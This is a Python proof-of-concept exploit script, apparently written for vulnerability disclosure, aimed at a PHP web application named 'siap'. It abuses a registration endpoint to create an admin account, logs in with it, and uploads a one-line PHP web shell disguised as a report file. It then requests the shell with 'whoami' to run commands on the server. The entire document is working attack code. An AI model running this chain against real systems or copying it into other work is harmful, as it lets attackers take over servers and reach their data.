# Chaining Broken Logic (Create Admin) -> File Upload
import requests

daftar_url = 'http://localhost/siap/daftarNA.php'
login_url = 'http://localhost/siap/admin/cek.php'
upload_url = 'http://localhost/siap/admin/tambahKP.php'
shell_url = 'http://localhost/siap/image/koleksi/union.php?1=whoami'
headers = {'Content-Type':'application/x-www-form-urlencoded'}
body_data = "username=awx&password=awx&nama_user=it&level=admin&daftar=Daftar"

session = requests.Session()

r = requests.post(daftar_url, data=body_data, headers=headers)

if 'Berhasil Daftar !' in r.text:
    print('[+] User admin created!')
else:
    print('[-] Uh something wrong')

body_data = 'username=awx&password=awx&login=LOGIN'
r = session.post(url=login_url, data=body_data, headers=headers)
if 'Berhasil Login !' in r.text:
    print('[+] Success Login')

pshell = '<?=`$_GET[1]`?>'

form_data = {
    'judul': (None, 'KP-EvilShell'),
    'penulis': (None,'Ardias'),
    'nim': (None,'1337'),
    'jurusan': (None,'Teknik Sipil'),
    'dosbimKP': (None, ' RDX'),
    'dosbimKP1': (None, 'ARDX'),
    'subjek': (None, 'YesSir'),
    'barcode': (None, '1337'),
    'accno': (None, '1337'),
    'laporan': ('bad.php', pshell, 'application/x-php'),
    'simpan': (None, 'Tambah')
}

print('[i] Upload Shell')
r = session.post(url=upload_url, files=form_data)
if 'Berhasil Ditambahkan !' in r.text:
    print('[+] File Uploaded!')
else:
    print('[-] Failed to upload :(')

print(f'[i] Accessing Shell url in: {shell_url}')
r = requests.get(url=shell_url)
print('Resp:',r.text)
